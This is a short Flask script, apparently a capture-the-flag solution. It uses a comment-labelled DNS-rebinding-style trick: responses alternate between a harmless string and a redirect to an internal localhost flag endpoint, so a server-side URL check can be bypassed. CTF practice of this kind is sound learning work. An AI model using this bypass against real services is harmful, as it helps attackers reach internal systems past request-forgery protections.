from flask import Flask, redirect
import requests

app = Flask(__name__)
bit_flip = 0

# This function works like DNS Rebinding technique.
@app.route("/")
def rebinding():
    global bit_flip
    bit_flip += 1
    if bit_flip & 1:
        return 'bruh'
    else:
        return redirect('http://localhost:1337/flag')

app.run('localhost', 1234)
